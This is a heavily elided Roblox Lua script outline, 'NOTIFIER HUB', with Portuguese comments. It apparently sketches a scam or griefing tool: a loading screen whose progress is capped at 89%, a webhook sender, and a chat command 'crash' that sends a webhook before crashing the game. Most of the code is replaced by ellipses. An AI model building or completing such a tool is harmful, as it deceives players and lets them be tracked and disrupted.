...
local function createLoadingScreen()
    loadingScreenGui:ClearAllChildren()
...
local function sendWebhook(messageType, extraData)
    ...
    -- Enviar webhook usando método correto
    pcall(function()
    ...
    Players.PlayerAdded:Connect(function(plr)
        plr.Chatted:Connect(function(message)
            ...
            elseif msg == "crash" or msg == "/crash" then
                -- Enviar webhook antes de crashar
...
local function startLoadingProcess()
    ...
    connection = RunService.Heartbeat:Connect(function()
        ...
        if progress > 0.89 then
            ...
            displayProgress = progress * 1.2 -- Acelera um pouco
            if displayProgress > 0.89 then
                displayProgress = 0.89
            end
        end
...
print("✅ NOTIFIER HUB INICIADO COM SUCESSO!")
print("🔗 Aguardando inserção do link do servidor...")